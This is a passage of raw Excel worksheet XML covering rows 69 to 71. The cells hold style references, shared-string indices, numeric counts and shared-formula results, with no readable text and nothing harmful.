      <c r="S69" s="396"/>
      <c r="T69" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U69" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V69" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W69" s="231"/>
      <c r="X69" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y69" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z69" s="256" t="s">
        <v>2471</v>
      </c>
      <c r="AA69" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB69" s="256" t="s">
        <v>2472</v>
      </c>
      <c r="AC69" s="226" t="s">
        <v>1193</v>
      </c>
      <c r="AD69" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE69" s="259" t="s">
        <v>1197</v>
      </c>
      <c r="AF69" s="275" t="s">
        <v>1194</v>
      </c>
      <c r="AG69" s="225" t="s">
        <v>1195</v>
      </c>
      <c r="AH69" s="273" t="s">
        <v>1196</v>
      </c>
      <c r="AI69" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ69" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK69" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL69" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM69" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN69" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO69" s="290" t="s">
        <v>13</v>
      </c>
      <c r="AP69" s="230"/>
      <c r="AQ69" s="230"/>
      <c r="AR69" s="288">
        <v>145</v>
      </c>
      <c r="AS69" s="288">
        <v>1</v>
      </c>
      <c r="AT69" s="288">
        <v>0</v>
      </c>
      <c r="AU69" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV69" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW69" s="288">
        <v>8</v>
      </c>
      <c r="AX69" s="288">
        <v>8</v>
      </c>
      <c r="AY69" s="288">
        <v>0</v>
      </c>
      <c r="AZ69" s="288">
        <f t="shared" si="21"/>
        <v>8</v>
      </c>
      <c r="BA69" s="289"/>
      <c r="BB69" s="301">
        <v>1</v>
      </c>
      <c r="BC69" s="302">
        <v>0</v>
      </c>
      <c r="BD69" s="302">
        <v>254</v>
      </c>
      <c r="BE69" s="302">
        <v>1</v>
      </c>
      <c r="BF69" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG69" s="302">
        <v>254</v>
      </c>
      <c r="BH69" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI69" s="302">
        <v>254</v>
      </c>
      <c r="BJ69" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK69" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL69" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM69" s="302">
        <v>0</v>
      </c>
      <c r="BN69" s="304">
        <v>147</v>
      </c>
      <c r="BO69" s="304">
        <v>1</v>
      </c>
      <c r="BP69" s="304">
        <v>0</v>
      </c>
      <c r="BQ69" s="304">
        <v>0</v>
      </c>
      <c r="BR69" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS69" s="304">
        <v>1</v>
      </c>
      <c r="BT69" s="304">
        <v>0</v>
      </c>
      <c r="BU69" s="304">
        <v>1</v>
      </c>
      <c r="BV69" s="305">
        <v>0</v>
      </c>
      <c r="BW69" s="317">
        <v>1</v>
      </c>
      <c r="BX69" s="318">
        <v>0</v>
      </c>
      <c r="BY69" s="318">
        <v>254</v>
      </c>
      <c r="BZ69" s="318">
        <v>1</v>
      </c>
      <c r="CA69" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB69" s="318">
        <v>254</v>
      </c>
      <c r="CC69" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD69" s="318">
        <v>254</v>
      </c>
      <c r="CE69" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF69" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG69" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH69" s="318">
        <v>0</v>
      </c>
      <c r="CI69" s="319">
        <v>145</v>
      </c>
      <c r="CJ69" s="319">
        <v>1</v>
      </c>
      <c r="CK69" s="319">
        <v>0</v>
      </c>
      <c r="CL69" s="319">
        <v>0</v>
      </c>
      <c r="CM69" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN69" s="319">
        <v>1</v>
      </c>
      <c r="CO69" s="319">
        <v>0</v>
      </c>
      <c r="CP69" s="319">
        <v>1</v>
      </c>
      <c r="CQ69" s="319">
        <v>0</v>
      </c>
      <c r="CR69" s="319">
        <v>1</v>
      </c>
      <c r="CS69" s="320">
        <v>0</v>
      </c>
      <c r="CT69" s="339">
        <v>8</v>
      </c>
      <c r="CU69" s="340">
        <v>35</v>
      </c>
      <c r="CV69" s="340" t="s">
        <v>1200</v>
      </c>
      <c r="CW69" s="340">
        <v>5</v>
      </c>
      <c r="CX69" s="340"/>
      <c r="CY69" s="340" t="s">
        <v>1201</v>
      </c>
      <c r="CZ69" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA69" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB69" s="340" t="str">
        <f t="shared" si="29"/>
        <v>24096, 24097, 24094, -</v>
      </c>
      <c r="DC69" s="340" t="s">
        <v>1202</v>
      </c>
      <c r="DD69" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE69" s="340">
        <v>3</v>
      </c>
      <c r="DF69" s="341">
        <v>147</v>
      </c>
      <c r="DG69" s="341">
        <v>30</v>
      </c>
      <c r="DH69" s="341">
        <v>1</v>
      </c>
      <c r="DI69" s="341">
        <v>0</v>
      </c>
      <c r="DJ69" s="341">
        <f t="shared" si="30"/>
        <v>1</v>
      </c>
      <c r="DK69" s="341">
        <v>43</v>
      </c>
      <c r="DL69" s="341">
        <v>1</v>
      </c>
      <c r="DM69" s="341">
        <v>43</v>
      </c>
      <c r="DN69" s="341">
        <v>0</v>
      </c>
      <c r="DO69" s="341">
        <v>43</v>
      </c>
      <c r="DP69" s="342">
        <v>1</v>
      </c>
      <c r="DQ69" s="355">
        <v>71</v>
      </c>
      <c r="DR69" s="356">
        <v>36</v>
      </c>
      <c r="DS69" s="356" t="s">
        <v>1203</v>
      </c>
      <c r="DT69" s="356">
        <v>7</v>
      </c>
      <c r="DU69" s="356"/>
      <c r="DV69" s="356" t="s">
        <v>1204</v>
      </c>
      <c r="DW69" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX69" s="356" t="s">
        <v>247</v>
      </c>
      <c r="DY69" s="356" t="str">
        <f t="shared" si="31"/>
        <v>24096, 24094, 24097, -</v>
      </c>
      <c r="DZ69" s="356" t="s">
        <v>1205</v>
      </c>
      <c r="EA69" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB69" s="356">
        <v>3</v>
      </c>
      <c r="EC69" s="357">
        <v>145</v>
      </c>
      <c r="ED69" s="357">
        <v>52</v>
      </c>
      <c r="EE69" s="357">
        <v>1</v>
      </c>
      <c r="EF69" s="357">
        <v>0</v>
      </c>
      <c r="EG69" s="357">
        <f t="shared" si="32"/>
        <v>1</v>
      </c>
      <c r="EH69" s="357">
        <v>70</v>
      </c>
      <c r="EI69" s="357">
        <v>8</v>
      </c>
      <c r="EJ69" s="357">
        <v>43</v>
      </c>
      <c r="EK69" s="357">
        <v>28</v>
      </c>
      <c r="EL69" s="357">
        <v>71</v>
      </c>
      <c r="EM69" s="358">
        <v>8</v>
      </c>
      <c r="EN69" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP69" s="369"/>
      <c r="EQ69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES69" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV69" s="369"/>
      <c r="EW69" s="369">
        <v>15921</v>
      </c>
      <c r="EX69" s="369"/>
      <c r="EY69" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ69" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA69" s="369"/>
      <c r="FB69" s="369"/>
      <c r="FC69" s="369">
        <v>144</v>
      </c>
      <c r="FD69" s="369">
        <f t="shared" si="15"/>
        <v>1</v>
      </c>
      <c r="FE69" s="369">
        <v>0</v>
      </c>
      <c r="FF69" s="369">
        <v>1</v>
      </c>
      <c r="FG69" s="369">
        <v>1</v>
      </c>
      <c r="FH69" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI69" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ69" s="378">
        <v>65</v>
      </c>
      <c r="FK69" s="378"/>
      <c r="FL69" s="378" t="s">
        <v>1207</v>
      </c>
      <c r="FM69" s="378">
        <v>4</v>
      </c>
      <c r="FN69" s="378"/>
      <c r="FO69" s="378" t="s">
        <v>1207</v>
      </c>
      <c r="FP69" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ69" s="378"/>
      <c r="FR69" s="380" t="s">
        <v>1206</v>
      </c>
      <c r="FS69" s="380"/>
      <c r="FT69" s="380"/>
      <c r="FU69" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV69" s="378"/>
      <c r="FW69" s="378"/>
      <c r="FX69" s="378">
        <v>144</v>
      </c>
      <c r="FY69" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ69" s="378">
        <v>0</v>
      </c>
      <c r="GA69" s="378" t="s">
        <v>391</v>
      </c>
      <c r="GB69" s="378">
        <v>1</v>
      </c>
      <c r="GC69" s="379" t="s">
        <v>12</v>
      </c>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J69" s="40"/>
      <c r="JK69" s="40"/>
      <c r="JL69" s="40"/>
      <c r="JM69" s="40"/>
      <c r="JN69" s="40"/>
      <c r="JO69" s="40"/>
      <c r="JP69" s="40"/>
      <c r="JQ69" s="40"/>
      <c r="JR69" s="40"/>
      <c r="JS69" s="40"/>
      <c r="JT69" s="40"/>
      <c r="JU69" s="40"/>
      <c r="JV69" s="40"/>
      <c r="JW69" s="40"/>
      <c r="JX69" s="40"/>
      <c r="JY69" s="40"/>
      <c r="JZ69" s="40"/>
      <c r="KA69" s="40"/>
      <c r="KB69" s="40"/>
      <c r="KC69" s="40"/>
      <c r="KD69" s="40"/>
      <c r="KE69" s="40"/>
      <c r="KF69" s="40"/>
      <c r="KG69" s="40"/>
      <c r="KH69" s="40"/>
      <c r="KI69" s="40"/>
      <c r="KJ69" s="40"/>
      <c r="KK69" s="40"/>
      <c r="KL69" s="40"/>
      <c r="KM69" s="40"/>
      <c r="KN69" s="40"/>
      <c r="KO69" s="40"/>
      <c r="KP69" s="40"/>
      <c r="KQ69" s="40"/>
      <c r="KR69" s="40"/>
      <c r="KS69" s="40"/>
      <c r="KT69" s="40"/>
      <c r="KU69" s="40"/>
      <c r="KV69" s="40"/>
      <c r="KW69" s="40"/>
      <c r="KX69" s="40"/>
      <c r="KY69" s="40"/>
      <c r="KZ69" s="40"/>
      <c r="LA69" s="40"/>
      <c r="LB69" s="40"/>
      <c r="LC69" s="40"/>
      <c r="LD69" s="40"/>
      <c r="LE69" s="40"/>
      <c r="LF69" s="40"/>
      <c r="LG69" s="40"/>
      <c r="LH69" s="40"/>
      <c r="LI69" s="40"/>
    </row>
    <row r="70" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B70" s="224" t="s">
        <v>591</v>
      </c>
      <c r="C70" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D70" s="225" t="s">
        <v>592</v>
      </c>
      <c r="E70" s="225" t="s">
        <v>1208</v>
      </c>
      <c r="F70" s="225">
        <v>42</v>
      </c>
      <c r="G70" s="225" t="s">
        <v>1209</v>
      </c>
      <c r="H70" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I70" s="225"/>
      <c r="J70" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K70" s="227" t="s">
        <v>1210</v>
      </c>
      <c r="L70" s="228" t="s">
        <v>12</v>
      </c>
      <c r="M70" s="227" t="s">
        <v>1211</v>
      </c>
      <c r="N70" s="227" t="s">
        <v>1212</v>
      </c>
      <c r="O70" s="389" t="s">
        <v>2715</v>
      </c>
      <c r="P70" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q70" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R70" s="225"/>
      <c r="S70" s="396"/>
      <c r="T70" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U70" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V70" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W70" s="231"/>
      <c r="X70" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y70" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z70" s="256" t="s">
        <v>1213</v>
      </c>
      <c r="AA70" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB70" s="256" t="s">
        <v>2473</v>
      </c>
      <c r="AC70" s="226" t="s">
        <v>1214</v>
      </c>
      <c r="AD70" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE70" s="259" t="s">
        <v>1218</v>
      </c>
      <c r="AF70" s="275" t="s">
        <v>1215</v>
      </c>
      <c r="AG70" s="225" t="s">
        <v>1216</v>
      </c>
      <c r="AH70" s="273" t="s">
        <v>1217</v>
      </c>
      <c r="AI70" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ70" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK70" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL70" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM70" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN70" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO70" s="290"/>
      <c r="AP70" s="230"/>
      <c r="AQ70" s="230"/>
      <c r="AR70" s="288">
        <v>12</v>
      </c>
      <c r="AS70" s="288">
        <v>1</v>
      </c>
      <c r="AT70" s="288">
        <v>1</v>
      </c>
      <c r="AU70" s="288">
        <f t="shared" si="24"/>
        <v>2</v>
      </c>
      <c r="AV70" s="256" t="s">
        <v>503</v>
      </c>
      <c r="AW70" s="288">
        <v>1</v>
      </c>
      <c r="AX70" s="288">
        <v>1</v>
      </c>
      <c r="AY70" s="288">
        <v>1</v>
      </c>
      <c r="AZ70" s="288">
        <f t="shared" si="21"/>
        <v>2</v>
      </c>
      <c r="BA70" s="289" t="s">
        <v>1231</v>
      </c>
      <c r="BB70" s="301">
        <v>3</v>
      </c>
      <c r="BC70" s="302">
        <v>1</v>
      </c>
      <c r="BD70" s="302" t="s">
        <v>1219</v>
      </c>
      <c r="BE70" s="302">
        <v>3</v>
      </c>
      <c r="BF70" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG70" s="302" t="s">
        <v>1220</v>
      </c>
      <c r="BH70" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI70" s="302" t="s">
        <v>1220</v>
      </c>
      <c r="BJ70" s="302" t="str">
        <f t="shared" si="25"/>
        <v>46979, -</v>
      </c>
      <c r="BK70" s="302">
        <v>46979</v>
      </c>
      <c r="BL70" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM70" s="302">
        <v>1</v>
      </c>
      <c r="BN70" s="304">
        <v>35</v>
      </c>
      <c r="BO70" s="304">
        <v>2</v>
      </c>
      <c r="BP70" s="304">
        <v>1</v>
      </c>
      <c r="BQ70" s="304">
        <v>0</v>
      </c>
      <c r="BR70" s="304">
        <f t="shared" si="26"/>
        <v>1</v>
      </c>
      <c r="BS70" s="304">
        <v>8</v>
      </c>
      <c r="BT70" s="304">
        <v>1</v>
      </c>
      <c r="BU70" s="304">
        <v>8</v>
      </c>
      <c r="BV70" s="305">
        <v>1</v>
      </c>
      <c r="BW70" s="317">
        <v>13</v>
      </c>
      <c r="BX70" s="318">
        <v>3</v>
      </c>
      <c r="BY70" s="318" t="s">
        <v>1221</v>
      </c>
      <c r="BZ70" s="318">
        <v>8</v>
      </c>
      <c r="CA70" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB70" s="318" t="s">
        <v>1222</v>
      </c>
      <c r="CC70" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD70" s="318" t="s">
        <v>1222</v>
      </c>
      <c r="CE70" s="318" t="str">
        <f t="shared" si="27"/>
        <v>2031379, 2025644, 46979, -</v>
      </c>
      <c r="CF70" s="326" t="s">
        <v>1223</v>
      </c>
      <c r="CG70" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH70" s="318">
        <v>3</v>
      </c>
      <c r="CI70" s="319">
        <v>11</v>
      </c>
      <c r="CJ70" s="319">
        <v>6</v>
      </c>
      <c r="CK70" s="319">
        <v>1</v>
      </c>
      <c r="CL70" s="319">
        <v>0</v>
      </c>
      <c r="CM70" s="319">
        <f t="shared" si="28"/>
        <v>1</v>
      </c>
      <c r="CN70" s="319">
        <v>13</v>
      </c>
      <c r="CO70" s="319">
        <v>1</v>
      </c>
      <c r="CP70" s="319">
        <v>8</v>
      </c>
      <c r="CQ70" s="319">
        <v>5</v>
      </c>
      <c r="CR70" s="319">
        <v>13</v>
      </c>
      <c r="CS70" s="320">
        <v>1</v>
      </c>
      <c r="CT70" s="339">
        <v>19</v>
      </c>
      <c r="CU70" s="340">
        <v>3</v>
      </c>
      <c r="CV70" s="340" t="s">
        <v>1224</v>
      </c>
      <c r="CW70" s="340">
        <v>9</v>
      </c>
      <c r="CX70" s="340"/>
      <c r="CY70" s="340" t="s">
        <v>1225</v>
      </c>
      <c r="CZ70" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA70" s="340" t="s">
        <v>1225</v>
      </c>
      <c r="DB70" s="340" t="str">
        <f t="shared" si="29"/>
        <v>2031379, 2025644, 46979, -</v>
      </c>
      <c r="DC70" s="340" t="s">
        <v>1226</v>
      </c>
      <c r="DD70" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE70" s="340">
        <v>3</v>
      </c>
      <c r="DF70" s="341">
        <v>35</v>
      </c>
      <c r="DG70" s="341">
        <v>6</v>
      </c>
      <c r="DH70" s="341">
        <v>1</v>
      </c>
      <c r="DI70" s="341">
        <v>0</v>
      </c>
      <c r="DJ70" s="341">
        <f t="shared" si="30"/>
        <v>1</v>
      </c>
      <c r="DK70" s="341">
        <v>13</v>
      </c>
      <c r="DL70" s="341">
        <v>1</v>
      </c>
      <c r="DM70" s="341">
        <v>14</v>
      </c>
      <c r="DN70" s="341">
        <v>5</v>
      </c>
      <c r="DO70" s="341">
        <v>19</v>
      </c>
      <c r="DP70" s="342">
        <v>1</v>
      </c>
      <c r="DQ70" s="355">
        <v>39</v>
      </c>
      <c r="DR70" s="356">
        <v>3</v>
      </c>
      <c r="DS70" s="356" t="s">
        <v>1227</v>
      </c>
      <c r="DT70" s="356">
        <v>18</v>
      </c>
      <c r="DU70" s="356"/>
      <c r="DV70" s="356" t="s">
        <v>1228</v>
      </c>
      <c r="DW70" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX70" s="356" t="s">
        <v>1229</v>
      </c>
      <c r="DY70" s="356" t="str">
        <f t="shared" si="31"/>
        <v>46979, 2031379, 2025644
, -</v>
      </c>
      <c r="DZ70" s="356" t="s">
        <v>1230</v>
      </c>
      <c r="EA70" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB70" s="356">
        <v>3</v>
      </c>
      <c r="EC70" s="357">
        <v>11</v>
      </c>
      <c r="ED70" s="357">
        <v>7</v>
      </c>
      <c r="EE70" s="357">
        <v>1</v>
      </c>
      <c r="EF70" s="357">
        <v>0</v>
      </c>
      <c r="EG70" s="357">
        <f t="shared" si="32"/>
        <v>1</v>
      </c>
      <c r="EH70" s="357">
        <v>19</v>
      </c>
      <c r="EI70" s="357">
        <v>1</v>
      </c>
      <c r="EJ70" s="357">
        <v>14</v>
      </c>
      <c r="EK70" s="357">
        <v>25</v>
      </c>
      <c r="EL70" s="357">
        <v>39</v>
      </c>
      <c r="EM70" s="358">
        <v>1</v>
      </c>
      <c r="EN70" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO70" s="369">
        <v>1</v>
      </c>
      <c r="EP70" s="369"/>
      <c r="EQ70" s="369">
        <v>12449</v>
      </c>
      <c r="ER70" s="369">
        <v>1</v>
      </c>
      <c r="ES70" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET70" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU70" s="369">
        <v>12449</v>
      </c>
      <c r="EV70" s="369"/>
      <c r="EW70" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX70" s="369"/>
      <c r="EY70" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ70" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA70" s="369"/>
      <c r="FB70" s="369"/>
      <c r="FC70" s="369">
        <v>34</v>
      </c>
      <c r="FD70" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE70" s="369">
        <v>0</v>
      </c>
      <c r="FF70" s="369">
        <v>0</v>
      </c>
      <c r="FG70" s="369">
        <v>1</v>
      </c>
      <c r="FH70" s="370" t="s">
        <v>1232</v>
      </c>
      <c r="FI70" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ70" s="378">
        <v>7</v>
      </c>
      <c r="FK70" s="378"/>
      <c r="FL70" s="378" t="s">
        <v>1233</v>
      </c>
      <c r="FM70" s="378">
        <v>2</v>
      </c>
      <c r="FN70" s="378"/>
      <c r="FO70" s="378">
        <v>9999</v>
      </c>
      <c r="FP70" s="378">
        <v>33515</v>
      </c>
      <c r="FQ70" s="378"/>
      <c r="FR70" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS70" s="380"/>
      <c r="FT70" s="380"/>
      <c r="FU70" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV70" s="378"/>
      <c r="FW70" s="378"/>
      <c r="FX70" s="378">
        <v>8</v>
      </c>
      <c r="FY70" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ70" s="378">
        <v>1</v>
      </c>
      <c r="GA70" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB70" s="378">
        <v>2</v>
      </c>
      <c r="GC70" s="379" t="s">
        <v>1234</v>
      </c>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IY70" s="40"/>
      <c r="IZ70" s="40"/>
      <c r="JA70" s="40"/>
      <c r="JB70" s="40"/>
      <c r="JC70" s="40"/>
      <c r="JD70" s="40"/>
      <c r="JE70" s="40"/>
      <c r="JF70" s="40"/>
      <c r="JG70" s="40"/>
      <c r="JH70" s="40"/>
      <c r="JI70" s="40"/>
      <c r="JJ70" s="40"/>
      <c r="JK70" s="40"/>
      <c r="JL70" s="40"/>
      <c r="JM70" s="40"/>
      <c r="JN70" s="40"/>
      <c r="JO70" s="40"/>
      <c r="JP70" s="40"/>
      <c r="JQ70" s="40"/>
      <c r="JR70" s="40"/>
      <c r="JS70" s="40"/>
      <c r="JT70" s="40"/>
      <c r="JU70" s="40"/>
      <c r="JV70" s="40"/>
      <c r="JW70" s="40"/>
      <c r="JX70" s="40"/>
      <c r="JY70" s="40"/>
      <c r="JZ70" s="40"/>
      <c r="KA70" s="40"/>
      <c r="KB70" s="40"/>
      <c r="KC70" s="40"/>
      <c r="KD70" s="40"/>
      <c r="KE70" s="40"/>
      <c r="KF70" s="40"/>
      <c r="KG70" s="40"/>
      <c r="KH70" s="40"/>
      <c r="KI70" s="40"/>
      <c r="KJ70" s="40"/>
      <c r="KK70" s="40"/>
      <c r="KL70" s="40"/>
      <c r="KM70" s="40"/>
      <c r="KN70" s="40"/>
      <c r="KO70" s="40"/>
      <c r="KP70" s="40"/>
      <c r="KQ70" s="40"/>
      <c r="KR70" s="40"/>
      <c r="KS70" s="40"/>
      <c r="KT70" s="40"/>
      <c r="KU70" s="40"/>
      <c r="KV70" s="40"/>
      <c r="KW70" s="40"/>
      <c r="KX70" s="40"/>
      <c r="KY70" s="40"/>
      <c r="KZ70" s="40"/>
      <c r="LA70" s="40"/>
      <c r="LB70" s="40"/>
      <c r="LC70" s="40"/>
      <c r="LD70" s="40"/>
      <c r="LE70" s="40"/>
      <c r="LF70" s="40"/>
      <c r="LG70" s="40"/>
      <c r="LH70" s="40"/>
      <c r="LI70" s="40"/>
    </row>
    <row r="71" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B71" s="224" t="s">
        <v>273</v>
      </c>
      <c r="C71" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D71" s="225" t="s">
        <v>274</v>
      </c>
      <c r="E71" s="225" t="s">
        <v>1235</v>
      </c>
      <c r="F71" s="225">
        <v>43</v>
      </c>
      <c r="G71" s="225" t="s">
        <v>1236</v>
      </c>
      <c r="H71" s="226" t="s">
        <v>12</v>
      </c>
      <c r="I71" s="225"/>
      <c r="J71" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K71" s="227" t="s">
        <v>1237</v>
      </c>
      <c r="L71" s="228" t="s">
        <v>1240</v>
      </c>
      <c r="M71" s="227" t="s">
        <v>1238</v>
      </c>
      <c r="N71" s="227" t="s">
        <v>1239</v>
      </c>
      <c r="O71" s="389" t="s">
        <v>2716</v>
      </c>
      <c r="P71" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q71" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R71" s="225"/>
      <c r="S71" s="396"/>
      <c r="T71" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U71" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V71" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W71" s="231"/>
      <c r="X71" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y71" s="255" t="s">
        <v>422</v>
      </c>
      <c r="Z71" s="256" t="s">
        <v>1241</v>
      </c>
      <c r="AA71" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB71" s="256" t="s">
        <v>2474</v>
      </c>
      <c r="AC71" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD71" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE71" s="259" t="s">
        <v>1245</v>
      </c>
      <c r="AF71" s="270" t="s">
        <v>1242</v>
      </c>
      <c r="AG71" s="225" t="s">
        <v>1243</v>
      </c>
      <c r="AH71" s="271" t="s">
        <v>1244</v>
      </c>
      <c r="AI71" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ71" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK71" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL71" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM71" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN71" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO71" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP71" s="230"/>
      <c r="AQ71" s="230"/>
      <c r="AR71" s="288">
        <v>4</v>
      </c>
      <c r="AS71" s="288">
        <v>1</v>
      </c>
      <c r="AT71" s="288">
        <v>0</v>
      </c>
      <c r="AU71" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV71" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW71" s="288">
        <v>1</v>
      </c>
      <c r="AX71" s="288">
        <v>1</v>
      </c>
      <c r="AY71" s="288">
        <v>0</v>
      </c>
      <c r="AZ71" s="288">
        <f t="shared" si="21"/>
        <v>1</v>
      </c>
      <c r="BA71" s="289"/>
      <c r="BB71" s="301">
        <v>0</v>
      </c>
      <c r="BC71" s="302">
        <v>0</v>
      </c>
      <c r="BD71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE71" s="302">
        <v>0</v>
      </c>
      <c r="BF71" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ71" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL71" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM71" s="302">
        <v>0</v>
      </c>
      <c r="BN71" s="304">
        <v>4</v>
      </c>
      <c r="BO71" s="304">
        <v>0</v>
      </c>
      <c r="BP71" s="304">
        <v>0</v>
      </c>
      <c r="BQ71" s="304">
        <v>0</v>
      </c>
      <c r="BR71" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS71" s="304">
        <v>0</v>
      </c>
      <c r="BT71" s="304">
        <v>0</v>
      </c>
      <c r="BU71" s="304">
        <v>0</v>
      </c>
      <c r="BV71" s="305">
        <v>0</v>
      </c>
      <c r="BW71" s="317">
        <v>0</v>
      </c>
      <c r="BX71" s="318">
        <v>0</v>
      </c>
      <c r="BY71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ71" s="318">
        <v>0</v>
      </c>
      <c r="CA71" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE71" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG71" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH71" s="318">
        <v>0</v>
      </c>
      <c r="CI71" s="319">
        <v>4</v>
      </c>
